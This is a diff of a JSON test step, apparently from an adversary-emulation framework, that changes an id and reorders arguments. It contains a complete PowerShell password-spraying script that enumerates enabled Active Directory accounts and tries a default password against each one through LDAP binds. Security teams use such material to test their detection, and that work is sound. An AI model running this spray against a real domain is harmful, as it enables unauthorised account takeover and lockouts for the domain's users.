@@ -7,10 +7,10 @@
   ],
   "steps": [
     {
-      "id": "b4242c8c-eec9-403b-ba9e-e226d2d05dd9",
+      "id": "4c285900-91ad-4e85-ae01-7125799ce781",
       "type": "execute-command",
       "data": {
-        "command": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(\u0026(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = '#{password}'\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account ${user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\"\n",
+        "command": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(\u0026(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = '#{password}'\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account ${user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\"",
         "command_type": "powershell"
       },
       "elevation_required": false
@@ -22,6 +22,12 @@
   ],
   "input_arguments": [
     {
+      "name": "password",
+      "type": "string",
+      "description": "single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
+      "value": "P@ssw0rd!"
+    },
+    {
       "name": "domain",
       "type": "string",
       "description": "Domain FQDN",
@@ -32,12 +38,6 @@
       "type": "string",
       "description": "authentication method to choose between \"NTLM\" and \"Kerberos\"",
       "value": "NTLM"
-    },
-    {
-      "name": "password",
-      "type": "string",
-      "description": "single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
-      "value": "P@ssw0rd!"
     }
   ]
 }
